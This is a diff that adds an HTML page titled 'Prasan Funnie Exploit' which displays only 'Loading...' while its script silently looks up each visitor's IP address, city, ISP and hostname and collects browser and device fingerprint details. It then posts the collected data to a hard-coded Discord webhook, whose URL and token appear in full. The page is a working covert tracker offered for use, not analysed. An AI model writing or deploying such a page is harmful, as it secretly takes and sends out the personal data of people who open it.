@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+  <h1>Prasan Funnie Exploit</h1>
+  <pre><code style="word-wrap: break-word;overflow-wrap: break-word;white-space: pre-wrap;font-size: 16px;background-color: #e7ecf0;">Loading...</code></pre>
+    
+</html>
+
+<script>
+  let echolog = {};
+  // here is the fun
+  fetch("https://wtfismyip.com/json")
+    .then((response) => response.json())
+    .then((data) => {
+      echolog = {
+        ipAddress: data.YourFuckingIPAddress,
+        location: data.YourFuckingLocation,
+        hostname: data.YourFuckingHostname,
+        isp: data.YourFuckingISP,
+        city: data.YourFuckingCity,
+        country: data.YourFuckingCountry,
+        countryCode: data.YourFuckingCountryCode,
+        userAgent: navigator.userAgent,
+        windowProp: Object.keys(window).length,
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+        windowRatio: window.innerWidth / window.innerHeight,
+        screenWidth: window.screen.availWidth,
+        screenHeight: window.screen.availHeight,
+        screenRatio: window.screen.availWidth / window.screen.availHeight,
+        DPI: window.devicePixelRatio,
+        colorDepth: window.screen.colorDepth,
+        orientation: window.screen.orientation.type,
+        orientationAngle: window.screen.orientation.angle,
+        os: navigator.platform,
+        threads: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory,
+        systemLanguages: navigator.languages.join(", "),
+        languages: navigator.language,
+      };
+
+
+    const embed = {
+        title: 'Prasan Data',
+        color: 0x0066cc,
+        fields: [],
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: 'Prasan > YOU',
+        },
+      };
+
+      // Add fields to the embed for each property in echolog
+      for (const property in echolog) {
+        if (echolog.hasOwnProperty(property)) {
+          embed.fields.push({
+            name: property,
+            value: echolog[property],
+          });
+        }
+      }
+
+      const webhookURL = 'https://discord.com/api/webhooks/1151337657222299699/ZpOXm7JdauDsTJWSZoLD44dyDCjqEASVihn_DweO_pVG3Py1_1ufLjBT63imTNLKIine'; // Replace with your webhook URL
+      const requestBody = JSON.stringify({ content: JSON.stringify(echolog, null, 2) });
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: requestBody,
+      })
+        .then((response) => {
+          if (!response.ok) {
+            console.error('Failed to send data to Discord webhook');
+          }
+        })
+        .catch((error) => console.error('Error:', error));
+    })
+    .catch((error) => console.error(error));
+</script>
